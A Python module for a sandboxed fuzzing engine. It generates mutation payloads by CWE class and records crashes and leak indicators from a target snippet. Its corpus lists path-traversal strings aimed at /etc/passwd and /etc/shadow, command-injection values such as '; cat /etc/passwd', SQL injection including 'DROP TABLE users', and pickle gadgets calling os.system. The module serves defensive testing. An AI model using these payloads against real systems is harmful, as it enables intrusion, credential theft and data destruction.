from __future__ import annotations

import random
import string
import time
from typing import Any, Dict, List, Optional
from .dynamic_sandbox import DynamicSandbox


class FuzzingEngine:
    """
    Dynamic Fuzzing Engine.
    Generates intelligent mutation corpus based on CWE classes and records actual executed
    inputs, crash counts, fatal signals, and execution latency with ultra-fast batch execution.
    """

    def __init__(self, sandbox: Optional[DynamicSandbox] = None):
        self.sandbox = sandbox or DynamicSandbox(timeout_seconds=3.0)

    def generate_fuzz_corpus(self, cwe_type: str, count: int = 35) -> List[str]:
        """
        Generates targeted mutation payloads for specific vulnerability categories.
        """
        corpus = []

        # 1. Path Traversal Payloads (CWE-22)
        if "CWE-22" in cwe_type or "traversal" in cwe_type.lower():
            base_traversals = [
                "../../../../etc/passwd",
                "..\\..\\..\\..\\windows\\win.ini",
                "....//....//....//etc/shadow",
                "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
                "..%252f..%252f..%252fetc%252fpasswd",
                "/var/log/../../../../etc/passwd\x00.jpg",
                "..\\..\\..\\boot.ini",
                "/etc/hosts"
            ]
            corpus.extend(base_traversals)
            for _ in range(count):
                depth = random.randint(2, 8)
                sep = random.choice(["/", "\\", "//", "\\\\"])
                corpus.append((f"..{sep}" * depth) + random.choice(["etc/passwd", "windows/system32/drivers/etc/hosts", "secret.key"]))

        # 2. Command Injection Payloads (CWE-78)
        elif "CWE-78" in cwe_type or "command" in cwe_type.lower():
            base_commands = [
                "; cat /etc/passwd",
                "| whoami",
                "&& id",
                "`id`",
                "$(whoami)",
                "; ping -c 1 127.0.0.1",
                "& dir",
                "| net user",
                "\n/bin/sh\n",
                "; sleep 2"
            ]
            corpus.extend(base_commands)
            for _ in range(count):
                sep = random.choice([";", "&&", "|", "||", "&", "`", "$("])
                cmd = random.choice(["id", "whoami", "uname -a", "cat /etc/passwd", "dir", "ipconfig"])
                suffix = ")" if sep == "$(" else ("`" if sep == "`" else "")
                corpus.append(f"127.0.0.1 {sep} {cmd}{suffix}")

        # 3. SQL Injection Payloads (CWE-89)
        elif "CWE-89" in cwe_type or "sql" in cwe_type.lower():
            base_sqli = [
                "' OR '1'='1",
                "\" OR \"1\"=\"1",
                "' OR 1=1 --",
                "admin' --",
                "' UNION SELECT 1, 'admin', 'pass' --",
                "1; DROP TABLE users--",
                "' OR 'a'='a",
                "1' ORDER BY 1--",
                "admin'/*",
                "' OR sleep(1)='",
                "' OR (SELECT COUNT(*) FROM users) > 0 --"
            ]
            corpus.extend(base_sqli)
            for _ in range(count):
                quote = random.choice(["'", '"', "`"])
                op = random.choice(["OR", "AND", "UNION SELECT"])
                num = random.randint(1, 999)
                corpus.append(f"{quote} {op} {quote}{num}{quote}={quote}{num}{quote} --")

        # 4. Insecure Deserialization (CWE-502)
        elif "CWE-502" in cwe_type or "deserialization" in cwe_type.lower() or "pickle" in cwe_type.lower():
            base_pickle = [
                "cos\nsystem\n(S'id'\ntR.",
                "cposix\nsystem\n(S'cat /etc/passwd'\ntR.",
                "__import__('os').system('id')",
                "b'\\x80\\x04\\x95\\x18\\x00\\x00\\x00\\x00\\x00\\x00\\x00\\x8c\\x08builtins\\x94\\x8c\\x06system\\x94\\x93\\x94\\x8c\\x02id\\x94\\x85\\x94R\\x94.'",
                '{"__class__": "os.system", "args": ["id"]}',
                '{"telemetry_data": "malicious_serialized_gadget"}'
            ]
            corpus.extend(base_pickle)

        # 5. Default boundary & fuzz inputs
        corpus.extend([
            "",
            "A" * 100,
            "A" * 1000,
            "\x00",
            "%s%s%s%s%s",
            "127.0.0.1",
            "normal_standard_input",
            "true",
            "0",
            "-1",
            "99999999999999999999",
            "\u0915\u093e\u0930\u094d\u092f",
            "../../test.txt",
            "; echo safe"
        ])

        random.shuffle(corpus)
        return corpus

    def run_fuzz_campaign(
        self,
        code_content: str,
        cwe_type: str,
        iterations: int = 35,
        target_fn_name: str = "main"
    ) -> Dict[str, Any]:
        """
        Executes a high-speed dynamic fuzzing campaign against the target Python snippet,
        executing all inputs via batch runner and recording exit code statistics.
        """
        inputs = self.generate_fuzz_corpus(cwe_type, count=iterations)
        start_time = time.time()

        max_tests = min(len(inputs), max(10, iterations))
        selected_inputs = inputs[:max_tests]

        # Execute high-speed batch in isolated sandbox
        batch_results = self.sandbox.execute_batch_fuzz(code_content, selected_inputs)

        executed_inputs = []
        crashes = []
        unique_errors = set()
        interesting_inputs = []
        fatal_signals = 0
        timeouts = 0

        for res in batch_results:
            fuzz_input = res.get("input", "")
            executed_inputs.append(fuzz_input)
            
            if res.get("timeout"):
                timeouts += 1

            exit_code = res.get("exit_code")
            is_fatal_signal = bool(exit_code is not None and (exit_code < 0 or exit_code in (134, 139, 255, 3221225477, 3221225786)))
            if is_fatal_signal:
                fatal_signals += 1

            is_fatal_crash = res.get("crashed", False) or is_fatal_signal
            stdout_lower = res.get("stdout", "").lower()
            leak_detected = any(s in stdout_lower for s in ["root:x:", "uid=0", "admin_dump_success"])

            if is_fatal_crash or leak_detected:
                err_sig = res.get("stack_trace", "").splitlines()[-1] if res.get("stack_trace") else f"Exit code {exit_code}"
                if err_sig not in unique_errors:
                    unique_errors.add(err_sig)
                    crashes.append({
                        "input": fuzz_input,
                        "error_signature": err_sig,
                        "stderr": res.get("stderr", "")[:300],
                        "exit_code": exit_code
                    })
                    interesting_inputs.append(fuzz_input)

        duration = time.time() - start_time

        return {
            "executed_inputs": executed_inputs,
            "inputs_tested": len(executed_inputs),
            "total_crashes": len(crashes),
            "fatal_signals": fatal_signals,
            "timeouts": timeouts,
            "unique_crash_types": len(unique_errors),
            "crash_details": crashes,
            "duration_seconds": round(duration, 3),
            "interesting_inputs": interesting_inputs,
            "fuzz_status": "VULNERABILITY_CRASHES_FOUND" if crashes else "CLEAN_NO_CRASHES"
        }
